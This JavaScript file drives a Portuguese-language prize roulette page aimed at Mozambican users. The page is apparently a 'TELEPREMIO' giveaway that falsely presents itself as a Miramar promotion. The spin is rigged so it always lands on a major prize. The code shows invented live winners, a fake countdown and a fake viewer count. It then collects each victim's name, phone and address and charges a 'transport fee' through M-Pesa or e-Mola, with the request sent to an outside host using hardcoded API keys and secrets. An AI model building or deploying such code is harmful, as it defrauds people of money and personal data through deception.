let isSpinning = false;
let currentPrize = null;
let audioContext = null;

function initAudio() {
  if (!audioContext) {
    audioContext = new (window.AudioContext || window.webkitAudioContext)();
  }
}

function playRouletteSound() {
  initAudio();
  if (!audioContext) return;
  
  const oscillator = audioContext.createOscillator();
  const gainNode = audioContext.createGain();
  
  oscillator.connect(gainNode);
  gainNode.connect(audioContext.destination);
  
  oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
  
  for (let i = 0; i < 20; i++) {
    oscillator.frequency.setValueAtTime(800 - i * 30, audioContext.currentTime + i * 0.1);
  }
  
  gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
  gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 2);
  
  oscillator.start(audioContext.currentTime);
  oscillator.stop(audioContext.currentTime + 2);
}

function playWinSound() {
  initAudio();
  if (!audioContext) return;
  
  const notes = [523.25, 659.25, 783.99, 1046.50];
  
  notes.forEach((freq, i) => {
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.setValueAtTime(freq, audioContext.currentTime + i * 0.15);
    oscillator.type = 'sine';
    
    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime + i * 0.15);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + i * 0.15 + 0.5);
    
    oscillator.start(audioContext.currentTime + i * 0.15);
    oscillator.stop(audioContext.currentTime + i * 0.15 + 0.5);
  });
}

const prizes = [
  '100MT',
  'TXOPELA',
  'MOTORIZADA',
  '0MT',
  '0MT',
  '100MT',
  'CAMIONETA 4 TONELADAS',
  'TV PLASMA'
];

const winningPrizes = [1, 2, 6, 7];

const liveWinners = [
  { name: 'João de Maputo', prize: 'TV PLASMA' },
  { name: 'Maria de Beira', prize: 'TXOPELA' },
  { name: 'Carlos de Nampula', prize: 'MOTORIZADA' },
  { name: 'Ana de Xai-Xai', prize: 'CAMIONETA 4 TONELADAS' },
  { name: 'Luis de Quelimane', prize: 'TV PLASMA' },
  { name: 'Felicidade de Chimoio', prize: 'TXOPELA' },
  { name: 'Ernesto de Tete', prize: 'MOTORIZADA' },
  { name: 'Rosa de Lichinga', prize: 'CAMIONETA 4 TONELADAS' }
];

function startCountdown() {
  let hours = 2;
  let minutes = 14;
  let seconds = 55;

  setInterval(() => {
    seconds--;
    if (seconds < 0) {
      seconds = 59;
      minutes--;
      if (minutes < 0) {
        minutes = 59;
        hours--;
        if (hours < 0) {
          hours = 23;
        }
      }
    }
    
    const urgencyBox = document.querySelector('.urgency-box span:last-child');
    if (urgencyBox) {
      urgencyBox.innerHTML = `⏰ Promoção termina em <strong>${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}</strong>`;
    }
  }, 1000);
}

function startLiveNotifications() {
  setInterval(() => {
    const randomWinner = liveWinners[Math.floor(Math.random() * liveWinners.length)];
    showNotification(randomWinner.name, randomWinner.prize);
  }, 15000);
}

function showNotification(name, prize) {
  const notification = document.getElementById('notification');
  notification.innerHTML = `✅ ${name} recebeu ${prize} via M-Pesa`;
  notification.classList.add('show');
  
  setTimeout(() => {
    notification.classList.remove('show');
  }, 4000);
}

function createConfetti() {
  const colors = ['#ffd700', '#ff8c00', '#dc2626', '#059669', '#6a0dad'];
  
  for (let i = 0; i < 100; i++) {
    const confetti = document.createElement('div');
    confetti.style.cssText = `
      position: fixed;
      width: 10px;
      height: 10px;
      background: ${colors[Math.floor(Math.random() * colors.length)]};
      left: ${Math.random() * 100}%;
      top: -10px;
      border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
      z-index: 9999;
      pointer-events: none;
    `;
    document.body.appendChild(confetti);
    
    const animation = confetti.animate([
      { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
      { transform: `translateY(${window.innerHeight + 100}px) rotate(${Math.random() * 720}deg)`, opacity: 0 }
    ], {
      duration: Math.random() * 3000 + 2000,
      easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)'
    });
    
    animation.onfinish = () => confetti.remove();
  }
}

function playVideo() {
  const video = document.getElementById('promo-video');
  const playBtn = document.getElementById('video-play-btn');
  
  if (video) {
    video.play();
    video.muted = false;
    if (playBtn) {
      playBtn.classList.add('hidden');
    }
    
    setTimeout(() => {
      const gotoBtn = document.getElementById('goto-roulette-btn');
      if (gotoBtn) {
        gotoBtn.style.display = 'block';
      }
    }, 5000);
  }
}

function scrollToRoulette() {
  const rouletteSection = document.querySelector('.roulette-section');
  if (rouletteSection) {
    rouletteSection.scrollIntoView({ behavior: 'smooth' });
    
    setTimeout(() => {
      const spinButton = document.getElementById('spin-button');
      if (spinButton) {
        spinButton.style.display = 'inline-block';
        spinButton.style.animation = 'buttonPulse 2s infinite';
      }
    }, 500);
  }
}

function toggleFAQ(element) {
  const answer = element.nextElementSibling;
  const arrow = element.querySelector('.faq-arrow');
  
  if (answer.style.maxHeight) {
    answer.style.maxHeight = null;
    answer.style.padding = '0 20px';
    arrow.textContent = '▼';
  } else {
    answer.style.maxHeight = answer.scrollHeight + 'px';
    answer.style.padding = '20px';
    arrow.textContent = '▲';
  }
}

function updateViewersCount() {
  const viewersElement = document.getElementById('viewers-count');
  let currentViewers = 2847;
  
  setInterval(() => {
    const change = Math.floor(Math.random() * 20) - 10;
    currentViewers = Math.max(2500, Math.min(3500, currentViewers + change));
    viewersElement.textContent = currentViewers.toLocaleString('pt-PT');
  }, 3000);
}

function spinRoulette() {
  if (isSpinning) return;

  isSpinning = true;

  const roulette = document.getElementById('roulette');
  const spinButton = document.getElementById('spin-button');
  spinButton.disabled = true;

  playRouletteSound();
  
  const winningIndex = winningPrizes[Math.floor(Math.random() * winningPrizes.length)];
  currentPrize = prizes[winningIndex];
  
  const prizeDegree = 360 - (winningIndex * 45 + 22.5);
  const totalDegrees = 2520 + prizeDegree;
  
  roulette.style.transform = `rotate(${totalDegrees}deg)`;

  setTimeout(() => {
    isSpinning = false;
    spinButton.disabled = false;
    
    playWinSound();
    showPrizeModal(currentPrize);
  }, 5000);
}

function showPrizeModal(prize) {
  const modal = document.getElementById('prize-modal');
  const modalBody = document.getElementById('prize-modal-body');
  
  createConfetti();
  
  modalBody.innerHTML = `
    <div class="modal-body-content">
      <h2>🎉 Parabéns!</h2>
      <p>Você ganhou: <strong style="color: #ffd700; font-size: 1.5rem;">${prize}</strong></p>
      <button class="modal-btn" onclick="showDeliveryForm()">Resgatar Prêmio</button>
    </div>
  `;
  
  modal.style.display = 'block';
}

function showDeliveryForm() {
  closeModal('prize-modal');
  
  const modal = document.getElementById('form-modal');
  const modalBody = document.getElementById('form-modal-body');
  const today = new Date().toLocaleDateString('pt-PT');
  
  modalBody.innerHTML = `
    <div class="modal-body-content">
      <h2>🚚 Entrega do Prêmio</h2>
      
      <form id="delivery-form">
        <div class="form-group">
          <label>Nome Completo</label>
          <input type="text" id="user-name" required placeholder="Seu nome completo">
        </div>
        
        <div class="form-group">
          <label>Número de Telefone</label>
          <input type="tel" id="user-phone" required placeholder="84 1234567">
        </div>
        
        <div class="form-group">
          <label>Província</label>
          <select id="user-province" required>
            <option value="">Selecione a província</option>
            <option value="Maputo Cidade">Maputo Cidade</option>
            <option value="Maputo Província">Maputo Província</option>
            <option value="Gaza">Gaza</option>
            <option value="Inhambane">Inhambane</option>
            <option value="Sofala">Sofala</option>
            <option value="Manica">Manica</option>
            <option value="Tete">Tete</option>
            <option value="Zambézia">Zambézia</option>
            <option value="Nampula">Nampula</option>
            <option value="Cabo Delgado">Cabo Delgado</option>
            <option value="Niassa">Niassa</option>
          </select>
        </div>
        
        <div class="form-group">
          <label>Cidade</label>
          <input type="text" id="user-city" required placeholder="Sua cidade">
        </div>
        
        <div class="form-group">
          <label>Bairro</label>
          <input type="text" id="user-neighborhood" required placeholder="Seu bairro">
        </div>
        
        <div class="form-group">
          <label>Dia que Ganhou</label>
          <input type="text" id="win-date" value="${today}" readonly>
        </div>
        
        <div class="terms-text">
          <p><strong>✅ Parabéns!</strong> O prêmio será entregue sob termos e condições, será filmado ao receber o prêmio pela Miramar.</p>
        </div>
        
        <h3 style="margin: 30px 0 20px; color: #ffd700; font-size: 1.4rem;">Escolha a Taxa de Transporte</h3>
        
        <div class="delivery-options">
          <label class="delivery-option">
            <input type="radio" name="delivery" value="200" onclick="selectDelivery(this)">
            <div class="delivery-info">
              <div class="delivery-price">200MT</div>
              <div class="delivery-time">Recebe o prêmio na sua casa em 14 dias</div>
            </div>
          </label>
          
          <label class="delivery-option">
            <input type="radio" name="delivery" value="300" onclick="selectDelivery(this)">
            <div class="delivery-info">
              <div class="delivery-price">300MT</div>
              <div class="delivery-time">Recebe o prêmio na sua casa em 6 dias</div>
            </div>
          </label>
          
          <label class="delivery-option">
            <input type="radio" name="delivery" value="500" onclick="selectDelivery(this)">
            <div class="delivery-info">
              <div class="delivery-price">500MT</div>
              <div class="delivery-time">Recebe o prêmio na sua casa em 3 dias</div>
            </div>
          </label>
        </div>
        
        <div id="payment-section" style="display: none; margin-top: 30px;">
          <h3 style="margin: 0 0 20px; color: #ffd700; font-size: 1.4rem;">Escolha o Método de Pagamento</h3>
          
          <div class="payment-options">
            <label class="payment-option">
              <input type="radio" name="payment" value="mpesa" onclick="selectPayment(this)">
              <div class="payment-info">
                <img src="mpesaicon.jpeg" alt="M-Pesa" class="payment-option-icon">
                <div class="payment-name">M-Pesa</div>
              </div>
            </label>
            
            <label class="payment-option">
              <input type="radio" name="payment" value="emola" onclick="selectPayment(this)">
              <div class="payment-info">
                <img src="emolaIcone.png" alt="e-Mola" class="payment-option-icon">
                <div class="payment-name">e-Mola</div>
              </div>
            </label>
          </div>
        </div>
        
        <button type="button" id="finalize-btn" class="modal-btn" style="margin-top: 30px; font-size: 1.3rem; display: none;" onclick="submitForm()">Pagar Taxa de Transporte</button>
      </form>
    </div>
  `;
  
  modal.style.display = 'block';
}

let selectedDeliveryAmount = 0;

function selectDelivery(radio) {
  document.querySelectorAll('.delivery-option').forEach(option => {
    option.classList.remove('selected');
  });
  radio.closest('.delivery-option').classList.add('selected');
  
  selectedDeliveryAmount = parseInt(radio.value);
  
  document.getElementById('payment-section').style.display = 'block';
}

function selectPayment(radio) {
  document.querySelectorAll('.payment-option').forEach(option => {
    option.classList.remove('selected');
  });
  radio.closest('.payment-option').classList.add('selected');
  
  document.getElementById('finalize-btn').style.display = 'block';
}

async function submitForm() {
  const name = document.getElementById('user-name').value;
  const phone = document.getElementById('user-phone').value;
  const province = document.getElementById('user-province').value;
  const city = document.getElementById('user-city').value;
  const neighborhood = document.getElementById('user-neighborhood').value;
  const deliverySelected = document.querySelector('input[name="delivery"]:checked');
  const paymentSelected = document.querySelector('input[name="payment"]:checked');
  
  if (!name || !phone || !province || !city || !neighborhood) {
    alert('Por favor, preencha todos os campos!');
    return;
  }
  
  if (!deliverySelected) {
    alert('Por favor, selecione uma taxa de entrega!');
    return;
  }
  
  if (!paymentSelected) {
    alert('Por favor, selecione um método de pagamento!');
    return;
  }
  
  const paymentMethod = paymentSelected.value === 'mpesa' ? 'M-Pesa' : 'e-Mola';
  
  alert(`Processando pagamento de ${selectedDeliveryAmount}MT via ${paymentMethod}...`);
  
  try {
    if (paymentSelected.value === 'mpesa') {
      await processMpesaPayment(phone, selectedDeliveryAmount);
    } else {
      await processEmolaPayment(phone, selectedDeliveryAmount);
    }
    
    alert(`Pagamento realizado com sucesso!\n\nResgate confirmado, ${name}!\nPrêmio: ${currentPrize}\nTaxa: ${selectedDeliveryAmount}MT via ${paymentMethod}\n\nEntraremos em contacto em breve! 🎉`);
    
    closeModal('form-modal');
  } catch (error) {
    alert(`Erro no pagamento: ${error.message}\nPor favor, tente novamente.`);
  }
}

async function processMpesaPayment(phone, amount) {
  console.log('Iniciando pagamento M-Pesa:', { phone, amount });
  
  try {
    let apiUrl = 'https://lojasolucion.online/';
    let apiKey = '1926|sl2yZjLW24Yovjjh6lVCyHhWuFP4pWwqURkshSLgbd7acfd6';
    let webhookSecret = 'whsec_c1ab13667f73cc4067608c59ad1728cf4df2039632ad2ab2';
    
    try {
      if (typeof import.meta !== 'undefined' && import.meta.env) {
        apiUrl = import.meta.env.VITE_API_URL || apiUrl;
        apiKey = import.meta.env.VITE_MPESA_API_KEY || apiKey;
        webhookSecret = import.meta.env.VITE_WEBHOOK_SECRET || webhookSecret;
      }
    } catch (e) {}
    
    const response = await fetch(`${apiUrl}api/payment/mpesa`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${apiKey}`,
        'X-Webhook-Secret': webhookSecret
      },
      body: JSON.stringify({
        phone: phone,
        amount: amount,
        reference: `TELEPREMIO-${Date.now()}`,
        description: `Taxa de entrega para prêmio: ${currentPrize}`
      })
    });
    
    if (!response.ok) {
      throw new Error(`Erro na API: ${response.status}`);
    }
    
    const data = await response.json();
    console.log('Resposta M-Pesa:', data);
    
    return data;
  } catch (error) {
    console.error('Erro no pagamento M-Pesa:', error);
    throw error;
  }
}

async function processEmolaPayment(phone, amount) {
  console.log('Iniciando pagamento e-Mola:', { phone, amount });
  
  try {
    let apiUrl = 'https://lojasolucion.online/';
    let apiKey = '1926|sl2yZjLW24Yovjjh6lVCyHhWuFP4pWwqURkshSLgbd7acfd6';
    let webhookSecret = 'whsec_c1ab13667f73cc4067608c59ad1728cf4df2039632ad2ab2';
    
    try {
      if (typeof import.meta !== 'undefined' && import.meta.env) {
        apiUrl = import.meta.env.VITE_API_URL || apiUrl;
        apiKey = import.meta.env.VITE_EMOLA_API_KEY || apiKey;
        webhookSecret = import.meta.env.VITE_WEBHOOK_SECRET || webhookSecret;
      }
    } catch (e) {}
    
    const response = await fetch(`${apiUrl}api/payment/emola`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${apiKey}`,
        'X-Webhook-Secret': webhookSecret
      },
      body: JSON.stringify({
        phone: phone,
        amount: amount,
        reference: `TELEPREMIO-${Date.now()}`,
        description: `Taxa de entrega para prêmio: ${currentPrize}`
      })
    });
    
    if (!response.ok) {
      throw new Error(`Erro na API: ${response.status}`);
    }
    
    const data = await response.json();
    console.log('Resposta e-Mola:', data);
    
    return data;
  } catch (error) {
    console.error('Erro no pagamento e-Mola:', error);
    throw error;
  }
}

function closeModal(modalId) {
  document.getElementById(modalId).style.display = 'none';
}

window.onclick = function(event) {
  if (event.target.classList.contains('modal')) {
    event.target.style.display = 'none';
  }
}

function toggleVideo() {
  const video = document.getElementById('promo-video');
  const playButton = document.getElementById('play-button');
  
  if (video.muted) {
    video.muted = false;
    playButton.textContent = '🔇';
    video.play();
  } else {
    video.muted = true;
    playButton.textContent = '🔊';
  }
}

function showTerms() {
  document.getElementById('terms-modal').style.display = 'block';
}

function showPrivacy() {
  const modal = document.getElementById('terms-modal');
  const modalBody = modal.querySelector('.modal-body-content');
  modalBody.innerHTML = `
    <h2>🔒 Política de Privacidade</h2>
    <div style="text-align: left; max-height: 400px; overflow-y: auto; padding: 20px;">
      <h3>1. Coleta de Dados</h3>
      <p>Coletamos apenas os dados necessários para entrega do prêmio: nome, telefone, província, cidade e bairro.</p>
      
      <h3>2. Uso dos Dados</h3>
      <p>Seus dados são usados exclusivamente para contato e entrega do prêmio. Não compartilhamos com terceiros.</p>
      
      <h3>3. Segurança</h3>
      <p>Seus dados são armazenados de forma segura e eliminados após a entrega do prêmio.</p>
      
      <h3>4. Contato</h3>
      <p>Para dúvidas sobre privacidade: telepremio@tele.co.mz</p>
    </div>
  `;
  modal.style.display = 'block';
}

function toggleFAQ(element) {
  const answer = element.nextElementSibling;
  const arrow = element.querySelector('.faq-arrow');
  
  if (answer.style.display === 'block') {
    answer.style.display = 'none';
    arrow.textContent = '▼';
  } else {
    answer.style.display = 'block';
    arrow.textContent = '▲';
  }
}

window.onload = function() {
  // updateViewersCount();
  startCountdown();
  startLiveNotifications();
  initRoulette();
}

function initRoulette() {
  const roulette = document.getElementById('roulette');
  if (!roulette) return;
  
  const prizes = [
    '100MT',
    'TXOPELA',
    'MOTORIZADA',
    '0MT',
    '0MT',
    '100MT',
    'CAMIONETA 4 TONELADAS',
    'TV PLASMA'
  ];
  
  prizes.forEach((prize, index) => {
    const label = document.createElement('div');
    label.className = 'label-fixed';
    label.textContent = prize;
    
    const angle = index * 45 + 22.5;
    label.style.transform = `rotate(${angle}deg)`;
    
    const text = document.createElement('span');
    text.textContent = prize;
    text.style.display = 'inline-block';
    text.style.transform = `rotate(-${angle}deg)`;
    
    label.innerHTML = '';
    label.appendChild(text);
    
    roulette.appendChild(label);
  });
}
